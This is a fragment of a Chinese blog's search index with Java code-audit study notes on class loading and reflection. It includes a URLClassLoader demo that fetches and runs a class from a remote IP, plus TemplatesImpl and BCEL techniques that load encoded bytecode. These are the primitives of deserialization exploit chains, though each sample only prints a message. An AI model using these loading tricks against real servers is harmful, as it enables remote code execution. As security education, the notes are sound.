operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        URL<span class="token punctuation">[</span><span class="token punctuation">]</span> urls <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://49.???.???.???/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        URLClassLoader loader <span class="token operator">=</span> URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.Hello1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hello1<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Hello1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hacked by Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I am void main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><p>由于defineClass()方法的作用域是protected，外部类是无法调用的。因此在访问protected成员变量或方法必须通过setAccessible(true)，因此defineClass是不好直接调用的。</p><p>TemplatesImpl 类中定义了一个内部类TransletClassLoader ，重写了defineClass方法。</p><pre class="line-numbers language-java"><code class="language-java">        <span class="token comment" spellcheck="true">/**         * Access to final protected superclass member from outer class.         */</span>        Class <span class="token class-name">defineClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有声明修饰符就默认为default，可以从外部类访问。</p><p>调用链：</p><pre class="line-numbers language-java"><code class="language-java">TemplatesImpl#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TransletClassLoader#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>newTransformer方法是public可以直接调用，因此P牛的poc(去GitHub下个ysoserial)。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Reflections<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplateExp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// source: bytecodes/HelloTemplateImpl.java</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一大串字符是base64编码后的字节码，注意：字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p><p>接着我们要通过setFieldValue设置私有变量，_bytecodes为交给JVM的字节码，__name不为null就可以，这是因为👇</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//略</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置_tfactory是因为defineTransletClasses方法调用了TransformerFactoryImpl类中的getExternalExtensionsMap方法。</p><h4 id="BCEL-ClassLoader加载字节码"><a href="#BCEL-ClassLoader加载字节码" class="headerlink" title="BCEL ClassLoader加载字节码"></a>BCEL ClassLoader加载字节码</h4><p>BCEL是专门用来操控class字节码文件的类，jdk8u251后移除了BCEL的ClassLoader类，之前的版本可以利用。 Repository 用于将一个Java class转换为原生字节码，也可以直接使用javac命令来编译java文件生成字节码；Utility 将</p><p>原生的字节码转换成BCEL格式的字节码，注意Utility.encode生成的BCEL字节码要加上$$BCEL$$的前缀。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>Repository<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>JavaClass<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ClassLoader<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>Utility<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloBCEL</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        JavaClass cls <span class="token operator">=</span> Repository<span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>Hello1<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String code <span class="token operator">=</span> Utility<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$c2$40$Q$7d$x$95$d2R$BA$f0$5b$8bz$40$P$S$S$T$P$Y$3d$98$YL$88$9a$60$b8xZ$ca$G$X$fb$a1$a5$90$f0$b3$f4$a0$89$H$7f$80$3f$ca8$5bH$I$Jm2$d3$f7v$e6$cd$9b$ed$ef$df$f7$P$803$i$99$d0Q4P$c2z$K$h$s6$b1$95$c2$b6$8e$j$j$bb$M$c9$L$e9$cb$e8$92$nQ9n3h$d7AW0d$9b$d2$XwC$af$p$c2G$deq$89$c97$D$87$bbm$kJ$85$a7$a4$W$3d$cb$B$83$d5t$C$af$da$Q$ae$h$d4$ea$c4z$5c$fa$M$a5$caS$b3$cfG$bc$ear$bfWmE$a1$f4$7b$f5x$G$P$7b$d4UXp$cc$60$b6$82a$e8$88$h$a9$f4$d3$T$cdSUg$n$FC$c7$9e$85$7d$d8$e4$a7$c1$9d$X$d1$b5$3bc$bb$f56$94aT$T$3a$ca$W$Op$c8$90$b9$b5$b9g$8f$C$d9$b5$t$5e$cc$99A$86$dcl$ec$7d$a7$_$9ch$8ej$8d$H$91$f0$e8$3e$82$n$j$U$t$keP$7d$m$83$R$d9$U$dc$p$9b$85$F4$83$fe$aa$90K$D$8b$95E$bb$a3$8c$q$fd$M$f5$y$81$a9$85$u$9a$84$aeb$M$ac$9c$7c$81$7d$60$v$9f$f8$84$f6$k$97$a5$vf$90$a0$98$84F$cd$ea$k$yB$d6$a4$81$de$Me$DY$e4$a6b$e7S1C$J$z$cf$J$99$94A_Jb$sb$60$Vy$ca$b4V$5c$b9$f6$P$v$c2$l$b2$3c$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>$l$8b$I$A$A$A$A$A$A$AmQMO$c2$<span class="token number">40</span>$Q$<span class="token number">7d</span>$x$<span class="token number">95</span>$d2R$BA$f0$5b$8bz$<span class="token number">40</span>$P$S$S$T$P$Y<span class="token comment" spellcheck="true">//略</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：BCEL格式的字节码就是把原生字节码进行HEX编码，再把反斜线替换成$。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全基础 </tag>
            
            <tag> 类加载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—反射</title>
      <link href="/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/"/>
      <url>/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/</url>
      
        <content type="html"><![CDATA[<blockquote><p>反射是Java的一个重要特性，通过反射可以调用程序运行时任意类、对象的方法，也能访问或修改变量的值，并且能判断对象所属的类。</p></blockquote><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><p>弄明白反射还是要稍微深入了解实例化的过程，下面有个样例，取自代码审计星球反射系列下ir0ny师傅的评论。</p><p>Person p &#x3D; new Person(“zhangsan”,20); 实例化Person类，这句话做了什么？ </p><ol><li>因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。</li><li>执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</li><li>在堆内存中开辟空间，分配内存地址。</li><li>在堆内存中建立对象的特有属性。并进行默认初始化。 </li><li>对属性进行显示初始化。</li><li>对对象进行构造代码块初始化。</li><li>对对象进行对应的构造函数初始化。</li><li>将内存地址付给栈内存中的p变量。</li></ol><p>实例化TrainPrint，下面的代码将输出什么？getClass以及class就先理解为java文件编译后的class文件好了，代码改自Java安全漫谈。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainPrint</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Empty block initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Static initial %s\n"</span><span class="token punctuation">,</span> TrainPrint<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        TrainPrint trainPrint<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Static initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Empty block initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint<span class="token annotation punctuation">@4b67cf4d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到最先执行的就是静态代码块（注意这里用不了this，因为this指代当前TrainPrint这个类的对象，现在类刚刚加载，还没有分配内存地址)，随后执行代码块，然后执行构造方法，然后调用fuck方法输出this。</p><h4 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h4><p>我的理解：类对象就是java文件编译后的class文件，字节码存放于class文件中，之后交给JVM运行，因此获得了字节码就等于我们获得了程序运行时类的状态。</p><ol><li>forName()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>forName实现了动态加载类，因此还会执行静态代码块（类中static段的代码）。</p><ol start="2"><li>类名.class</li></ol><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">rt</span> <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅仅是获得类对象。</p><ol start="3"><li>getClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种要先获取实例化对象在拿到class object。</p><ol start="4"><li>getSystemClassLoader().loadClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅仅是获得类对象。</p><h4 id="获取类方法"><a href="#获取类方法" 